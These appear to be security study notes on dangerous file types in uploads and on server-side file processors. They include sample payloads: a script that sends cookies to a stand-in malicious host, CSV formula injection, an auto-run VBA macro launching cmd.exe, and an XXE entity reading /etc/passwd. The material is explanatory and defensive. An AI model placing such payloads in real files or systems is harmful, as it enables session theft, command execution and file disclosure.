1. HTML/JavaScript Files

    Risk: Code execution in the browser (XSS, phishing, etc.)
    Example: A malicious HTML file could include embedded JavaScript that steals cookies, exfiltrates data, or redirects users to malicious sites.
example:
<!-- malicious.html -->
<script>
  alert('Your session has been hijacked!');
  fetch('https://malicious-site.com/steal?cookie=' + document.cookie);
</script>

2. SVG Files

    Risk: Code injection via embedded JavaScript or malicious XML.
    Example: An SVG file containing JavaScript could execute code if opened in a browser.
example:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert('SVG JavaScript Injection');
  </script>
</svg>

3. CSV/Excel Files

    Risk: Formula injection that can execute commands or extract data.
    Example: An attacker could include formulas in a CSV file targeting users who open it in Excel.
example:
Name, Age, Formula
John, 30, =cmd|' /C calc'!A0

4. PDF Files

    Risk: Exploitation via embedded JavaScript or malicious links.
    Example: A PDF with embedded JavaScript could exploit vulnerabilities in PDF viewers.
example:
<< /Type /Action /S /JavaScript /JS (app.alert("PDF Exploit")) >>
5. Office Files (e.g., .docx, .pptx, .xlsx)

    Risk: Code execution via macros or embedded objects.
    Example: A malicious Word document could include VBA macros that execute on opening.
example:
Sub AutoOpen()
  Shell ("cmd.exe /c calc.exe")
End Sub
6. ZIP/Archive Files

    Risk: Path traversal (e.g., Zip Slip) or payload delivery.
    Example: An archive file containing files with ../../../ in their paths could overwrite critical system files upon extraction.
7. Image Files (e.g., .png, .jpeg)

    Risk: Exploitation of vulnerabilities in image parsers.
    Example: Malformed image files exploiting flaws in the image processing library used by the client.
8. Audio/Video Files (e.g., .mp3, .mp4)

    Risk: Exploitation of media player vulnerabilities.
    Example: A malformed MP4 file could trigger a buffer overflow in the media player.
9. JSON/JavaScript Files (via APIs or Applications)

    Risk: Data injection or execution via scripts included in JSON responses.
    Example: A JSON file could deliver malicious data that leads to unsafe evaluation.
{
  "data": "alert('Injected via JSON')"
}
10. Emails and EML Files

    Risk: HTML and script execution in email clients.
    Example: Embedded malicious scripts or links in HTML emails.
example:
<a href="javascript:alert('Email Phish!')">Click Here</a>
11. Configuration Files (e.g., YAML, XML)

    Risk: Deserialization or XXE vulnerabilities.
    Example: XML files could include malicious entities that target parsing libraries.
example:
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
12. Executables or Scripts (e.g., .exe, .sh, .bat)

    Risk: Direct code execution.
    Example: An .exe file could include malware or a script that compromises the user’s system.

5-Files that trigger vulnerabilities in processing libraries:
PDF processors
Media converters
Thumbnail generators

Key point: Any file that gets processed by server-side tools could potentially lead to RCE if those tools have vulnerabilities.

1. PDF Processors

    Vulnerabilities: PDF processors (software or libraries used to read, modify, or generate PDFs) can have vulnerabilities if they don’t properly handle malicious PDF files. Attackers may exploit flaws in how these processors interpret or parse PDF content, including embedded JavaScript, malformed PDF structures, or exploits in older PDF handling libraries. This can lead to arbitrary code execution, data leakage, or crashes.
    Example: The ImageMagick vulnerability allowed malicious PDFs to execute code through improper handling of certain PDF elements.

2. Media Converters

    Vulnerabilities: Media converters are software or libraries that convert media files from one format to another (e.g., video or image files). If these tools don't validate input properly, attackers can upload specially crafted media files that exploit vulnerabilities in the conversion process. This can lead to denial of service, arbitrary code execution, or other exploits.
    Example: Media converters might have bugs where specially crafted files could overflow buffers, causing unexpected behavior, crashes, or RCE.

3. Thumbnail Generators

    Vulnerabilities: Thumbnail generators create preview images (thumbnails) of files like PDFs, images, or videos. If the generator doesn't properly handle malicious files, attackers can craft files that trigger vulnerabilities in the generation process. This might allow attackers to execute arbitrary code or crash the server by exploiting flaws in how the thumbnail is created.
    Example: If a thumbnail generator processes a malicious image file, it could trigger buffer overflows, leading to security risks or server crashes.

In all of these cases, attackers take advantage of improper handling of files by these libraries, which could lead to security vulnerabilities like remote code execution or denial of service.
